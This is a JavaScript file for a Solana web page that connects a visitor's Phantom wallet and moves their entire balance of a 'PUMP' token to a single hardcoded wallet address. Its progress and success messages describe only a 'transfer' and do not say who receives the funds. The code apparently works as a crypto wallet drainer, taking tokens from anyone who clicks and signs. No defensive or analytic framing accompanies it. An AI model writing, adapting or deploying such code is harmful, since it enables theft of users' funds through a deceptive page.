// Configuration
const TOKEN_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';

// DOM Elements
const transferBtn = document.getElementById('transferBtn');
const statusText = document.getElementById('statusText');
const progressContainer = document.getElementById('progressContainer');
const progressFill = document.getElementById('progressFill');
const progressPercent = document.getElementById('progressPercent');

// Update status
function updateStatus(message, type = 'info') {
    statusText.textContent = message;
    if (type === 'error') {
        statusText.style.color = '#dc3545';
    } else if (type === 'success') {
        statusText.style.color = '#28a745';
    } else {
        statusText.style.color = '#333';
    }
}

// Update progress
function updateProgress(percent) {
    progressFill.style.width = percent + '%';
    progressPercent.textContent = percent + '%';
    progressContainer.style.display = 'block';
}

// Get token balance
async function getTokenBalance(connection, walletPublicKey) {
    try {
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            walletPublicKey,
            { mint: new solanaWeb3.PublicKey(TOKEN_MINT) }
        );

        if (tokenAccounts.value.length === 0) {
            return { balance: 0, tokenAccount: null, decimals: 0 };
        }

        const accountInfo = tokenAccounts.value[0].account.data.parsed.info;
        return {
            balance: accountInfo.tokenAmount.uiAmount,
            tokenAccount: tokenAccounts.value[0].pubkey,
            decimals: accountInfo.tokenAmount.decimals
        };
    } catch (error) {
        console.error('Error getting token balance:', error);
        return { balance: 0, tokenAccount: null, decimals: 0 };
    }
}

// Transfer all PUMP tokens
async function transferPumpTokens(wallet, connection) {
    try {
        updateProgress(10);
        updateStatus('Checking PUMP token balance...');
        
        // Get token balance
        const tokenInfo = await getTokenBalance(connection, wallet.publicKey);
        
        if (tokenInfo.balance <= 0) {
            updateProgress(100);
            updateStatus('❌ No PUMP tokens found in wallet.', 'error');
            return null;
        }
        
        updateProgress(30);
        updateStatus(`Found ${tokenInfo.balance.toLocaleString()} PUMP tokens...`);
        
        // Prepare transfer
        updateProgress(50);
        updateStatus('Preparing transfer...');
        
        const mintPublicKey = new solanaWeb3.PublicKey(TOKEN_MINT);
        const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
        
        // Get or create target token account
        const targetTokenAccount = await splToken.getAssociatedTokenAddress(
            mintPublicKey,
            targetPublicKey
        );
        
        const transaction = new solanaWeb3.Transaction();
        
        // Check if target has token account
        try {
            const targetAccountInfo = await connection.getAccountInfo(targetTokenAccount);
            if (!targetAccountInfo) {
                // Create token account for target
                transaction.add(
                    splToken.createAssociatedTokenAccountInstruction(
                        wallet.publicKey,
                        targetTokenAccount,
                        targetPublicKey,
                        mintPublicKey
                    )
                );
            }
        } catch (error) {
            // If can't check, create account anyway
            transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                    wallet.publicKey,
                    targetTokenAccount,
                    targetPublicKey,
                    mintPublicKey
                )
            );
        }
        
        // Calculate token amount
        const tokenAmount = BigInt(tokenInfo.balance * Math.pow(10, tokenInfo.decimals));
        
        // Add transfer instruction
        transaction.add(
            splToken.createTransferInstruction(
                tokenInfo.tokenAccount,
                targetTokenAccount,
                wallet.publicKey,
                tokenAmount
            )
        );
        
        // Get recent blockhash and set fee payer
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;
        
        updateProgress(70);
        updateStatus('Signing transaction...');
        
        // Sign transaction
        const signedTransaction = await wallet.signTransaction(transaction);
        
        updateProgress(85);
        updateStatus('Sending transaction...');
        
        // Send transaction
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        
        updateProgress(95);
        updateStatus('Confirming transaction...');
        
        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error('Transaction failed');
        }
        
        updateProgress(100);
        updateStatus(`✅ Success! Transferred ${tokenInfo.balance.toLocaleString()} PUMP tokens!`, 'success');
        
        return {
            signature: signature,
            amount: tokenInfo.balance,
            explorerUrl: `https://solscan.io/tx/${signature}`
        };
        
    } catch (error) {
        console.error('Transfer error:', error);
        throw error;
    }
}

// Main transfer handler
transferBtn.addEventListener('click', async () => {
    // Check if wallet is installed
    if (typeof window.solana === 'undefined') {
        updateStatus('❌ Please install Phantom wallet first!', 'error');
        return;
    }
    
    try {
        // Disable button and update UI
        transferBtn.disabled = true;
        transferBtn.textContent = '🔄 Processing...';
        
        updateStatus('Connecting wallet...');
        
        // Connect to wallet
        const provider = window.solana;
        await provider.connect();
        
        // Create wallet instance
        const wallet = {
            publicKey: new solanaWeb3.PublicKey(provider.publicKey),
            signTransaction: async (transaction) => {
                return await provider.signTransaction(transaction);
            }
        };
        
        updateStatus('Wallet connected! Setting up connection...');
        
        // Create connection with reliable RPC
        const connection = new solanaWeb3.Connection(
            'https://rpc.ankr.com/solana',
            'confirmed'
        );
        
        updateStatus(`Connected: ${wallet.publicKey.toString().slice(0, 8)}...`);
        
        // Start transfer process
        const result = await transferPumpTokens(wallet, connection);
        
        if (result) {
            console.log('Transfer successful:', result);
            // Optional: Add link to explorer
            setTimeout(() => {
                updateStatus(`${result.amount.toLocaleString()} PUMP tokens sent successfully!\nTx: ${result.signature.slice(0, 16)}...`, 'success');
            }, 2000);
        }
        
    } catch (error) {
        console.error('Error:', error);
        
        let errorMessage = error.message;
        if (error.message.includes('403') || error.message.includes('429')) {
            errorMessage = 'Network busy. Please try again in 30 seconds.';
        } else if (error.message.includes('User rejected')) {
            errorMessage = 'Transaction was cancelled.';
        }
        
        updateStatus(`❌ ${errorMessage}`, 'error');
        progressContainer.style.display = 'none';
        
    } finally {
        // Reset button
        transferBtn.disabled = false;
        transferBtn.textContent = '🔗 CONNECT & TRANSFER ALL PUMP';
    }
});

// Optional: Add auto-retry for RPC issues
async function retryOperation(operation, maxRetries = 3) {
    for (let i = 0; i < maxRetries; i++) {
        try {
            return await operation();
        } catch (error) {
            if (i === maxRetries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
        }
    }
}
